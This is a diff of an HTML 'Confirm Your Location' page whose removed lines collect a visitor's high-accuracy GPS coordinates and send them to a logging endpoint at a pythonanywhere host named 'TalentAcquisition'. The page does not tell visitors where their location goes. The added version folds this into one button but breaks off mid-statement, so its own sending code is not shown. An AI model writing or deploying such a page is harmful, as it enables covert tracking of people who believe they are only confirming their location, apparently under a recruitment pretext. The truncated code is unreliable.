@@ -25,19 +25,17 @@
 
         button {
             width:100%;
-            padding:12px;
-            margin-top:10px;
+            padding:14px;
             border:none;
             border-radius:8px;
             font-size:16px;
             cursor:pointer;
+            background:#007bff;
+            color:white;
         }
 
-        .btn { background:#007bff; color:white; }
-        .confirm { background:#28a745; color:white; }
-
         #status {
-            margin-top:10px;
+            margin-top:15px;
             color:gray;
             font-size:14px;
         }
@@ -47,24 +45,19 @@
 
 <div class="card">
 
-    <h3>📍 Confirm Location</h3>
+    <h3>📍 Confirm Your Location</h3>
 
-    <button class="btn" onclick="getLocation()">Get Location</button>
+    <button onclick="confirmLocation()">Confirm Location</button>
 
     <p id="status"></p>
-
-    <button class="confirm" onclick="sendLocation()">Confirm & Send</button>
 
 </div>
 
 <script>
 
-let lat = null;
-let lon = null;
+function confirmLocation() {
 
-function getLocation() {
-
-    document.getElementById("status").innerText = "Requesting location...";
+    document.getElementById("status").innerText = "Getting location...";
 
     if (!navigator.geolocation) {
         document.getElementById("status").innerText = "GPS not supported";
@@ -73,53 +66,5 @@ function getLocation() {
 
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            lat = pos.coords.latitude;
-            lon = pos.coords.longitude;
 
-            document.getElementById("status").innerText =
-                "Location received ✔ Now click Confirm";
-        },
-        (err) => {
-            document.getElementById("status").innerText =
-                "Location failed ❌ Enable permission";
-            console.log(err);
-        },
-        {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-        }
-    );
-}
-
-function sendLocation() {
-
-    if (!lat || !lon) {
-        alert("Click Get Location first");
-        return;
-    }
-
-    let url = "https://TalentAcquisition.pythonanywhere.com/log"
-        + "?lat=" + lat
-        + "&lon=" + lon
-        + "&ip=web"
-        + "&type=confirmed";
-
-    document.getElementById("status").innerText = "Sending...";
-
-    fetch(url)
-    .then(res => res.text())
-    .then(data => {
-        console.log("SUCCESS:", data);
-        document.getElementById("status").innerText = "Saved ✔";
-    })
-    .catch(err => {
-        console.log("ERROR:", err);
-        document.getElementById("status").innerText = "Failed ❌";
-    });
-}
-
-</script>
-
-</body>
-</html>
+            let
